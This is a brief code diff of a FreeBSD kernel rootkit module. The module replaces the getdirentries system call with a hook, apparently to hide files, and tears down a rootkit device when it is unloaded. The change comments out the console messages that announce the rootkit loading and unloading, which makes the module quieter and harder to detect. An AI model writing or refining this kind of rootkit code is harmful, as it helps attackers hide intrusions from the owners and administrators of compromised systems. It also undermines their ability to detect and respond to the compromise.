@@ -193,14 +193,14 @@ static int load(module_t module, int cmd, void *arg) {
 
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
 
-        if (error == 0)
-            printf("rootkit: module loaded\n");
+        // if (error == 0)
+        //     printf("rootkit: module loaded\n");
 
         break;
 
     case MOD_UNLOAD:
         destroy_rk_dev();
-        printf("rootkit: module unloaded\n");
+        // printf("rootkit: module unloaded\n");
         break;
 
     case MOD_SHUTDOWN:
